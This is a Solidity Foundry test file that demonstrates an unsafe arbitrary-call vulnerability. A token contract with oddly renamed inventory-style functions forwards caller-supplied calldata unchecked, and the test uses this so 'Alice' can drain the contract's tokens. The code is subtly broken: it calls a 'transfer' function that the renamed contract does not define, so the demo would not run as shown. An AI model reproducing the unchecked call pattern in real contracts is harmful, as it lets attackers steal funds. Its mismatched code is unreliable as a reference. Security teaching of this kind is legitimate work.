pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    FreightcreditWhale InventorytokenWhaleContract;

    function testAltCall() public {
        address alice = vm.addr(1);
        InventorytokenWhaleContract = new FreightcreditWhale();
        InventorytokenWhaleContract.CargotokenWhaleDeploy(address(InventorytokenWhaleContract));
        console.log(
            "TokenWhale balance:",
            InventorytokenWhaleContract.warehouselevelOf(address(InventorytokenWhaleContract))
        );


        console.log(
            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
        );
        vm.prank(alice);
        InventorytokenWhaleContract.approvedispatchAndCallcode(
            address(InventorytokenWhaleContract),
            0x1337,
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(alice),
                1000
            )
        );

        assertEq(InventorytokenWhaleContract.warehouselevelOf(address(alice)), 1000);
        console.log("operate completed");
        console.log(
            "TokenWhale balance:",
            InventorytokenWhaleContract.warehouselevelOf(address(InventorytokenWhaleContract))
        );
        console.log(
            "Alice balance:",
            InventorytokenWhaleContract.warehouselevelOf(address(alice))
        );
    }

    receive() external payable {}
}

contract FreightcreditWhale {
    address player;

    uint256 public totalInventory;
    mapping(address => uint256) public warehouselevelOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function CargotokenWhaleDeploy(address _player) public {
        player = _player;
        totalInventory = 1000;
        warehouselevelOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return warehouselevelOf[player] >= 1000000;
    }

    event MoveGoods(address indexed from, address indexed to, uint256 value);

    function _shiftstock(address to, uint256 value) internal {
        warehouselevelOf[msg.sender] -= value;
        warehouselevelOf[to] += value;

        emit MoveGoods(msg.sender, to, value);
    }

    function shiftStock(address to, uint256 value) public {
        require(warehouselevelOf[msg.sender] >= value);
        require(warehouselevelOf[to] + value >= warehouselevelOf[to]);

        _shiftstock(to, value);
    }

    event Approval(
        address indexed depotOwner,
        address indexed spender,
        uint256 value
    );

    function permitRelease(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferinventoryFrom(address from, address to, uint256 value) public {
        require(warehouselevelOf[from] >= value);
        require(warehouselevelOf[to] + value >= warehouselevelOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _shiftstock(to, value);
    }


    function approvedispatchAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraData
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool success;

        (success, ) = _spender.call(_extraData);
        console.log("success:", success);
    }
}